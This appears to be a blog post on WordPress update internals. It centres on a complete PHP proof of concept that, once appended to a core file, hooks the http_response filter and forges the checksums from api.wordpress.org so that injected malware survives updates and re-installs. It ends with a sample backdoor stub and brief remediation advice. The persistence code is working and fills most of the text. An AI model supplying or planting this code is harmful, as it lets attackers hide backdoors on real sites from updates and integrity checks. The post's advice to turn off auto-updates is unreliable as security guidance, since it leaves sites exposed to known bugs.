# WordPress updates from core and security

WordPress is on the auto-updates train for everything lately and they do it for "security". 
Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function `update_core` and that is the place where magic is happening. 
WP core is deciding via `get_core_checksums` what files need to be updated / rewritten and in this function we have this phone home call:
```
$http_url = 'http://api.wordpress.org/core/checksums/1.0/?' . http_build_query( compact( 'version', 'locale' ), null, '&' );
$url      = $http_url;
...
$response = wp_remote_get( $url, $options );
```
e.g. phoning home is extendable by any piece of software that is on the WP instance. This means that "security" perspective is possible only for bugs that are reported towards software vendor (core, plugin, theme), but for 0days, bypasses of the fix or already compromised sites this functionality practically means nothing. There are many another ways for piece of code to survive auto-updates, but here we are going to see / understand one easy, basic and effective. 

## Eli5 PoC

In the `ABSPATH . WPINC . '/plugin.php'` or any another file included / required after, append the following code: 

```
if ( ! function_exists("weaver_phoning_home") && function_exists("add_filter") ){
    function weaver_phoning_home($response, $parsed_args, $url){
        global $weaver_current_file;
        if ( strpos($url, "api.wordpress.org/core/checksums") !== false ){
            if ( ! is_wp_error( $response ) && 200 == wp_remote_retrieve_response_code( $response ) ) {
                if ( isset($response["body"]) ){
                    $body = json_decode( trim($response["body"]), true );
                    if ( is_array($body) && isset($body['checksums']) && is_array($body['checksums']) ) {
                        $alter_response = false;
                        foreach ( $body['checksums'] as $core_file => $md5checksum ){
                            if ( strpos($weaver_current_file, $core_file) !== false ){
                                $wmd5 = md5_file($weaver_current_file);
                                if ( $md5checksum !== $wmd5 ){
                                    $alter_response = true;
                                    $body['checksums'][$core_file] = $wmd5;
                                }
                            }
                        }
                        if ($alter_response){
                            $response["body"] = json_encode($body);
                            return $response;
                        }
                    }
                }
            }
        }
        return $response;
    }
    $weaver_current_file = __FILE__;
    add_filter('http_response', 'weaver_phoning_home', 1, 4);
}
//malware code below - any length, any logic
if ( isset($_REQUEST["wppply"])){
    exit("deeply");
}
```
Hit the update / re-install button, the code will remain in the file, stealth from update mechanism.

## Few facts

- This technique will work for core / wp-cli auto-updates / updates / re-install and for every security solution that relly on those functions. 
- There are few more places in the WP core where effective meddling with received data is possible  
- Two another approaches for WP not detectable malware exists wich will be covered in the next period
- With theme + plugin auto-updates, supply chain attacks will become extremely effective (theme + plugin ownership change)

## Remediation

- Turn off auto-updates and don't use update / re-install WP options in the name of security
- Server executable files shouldn't be writtable for those files

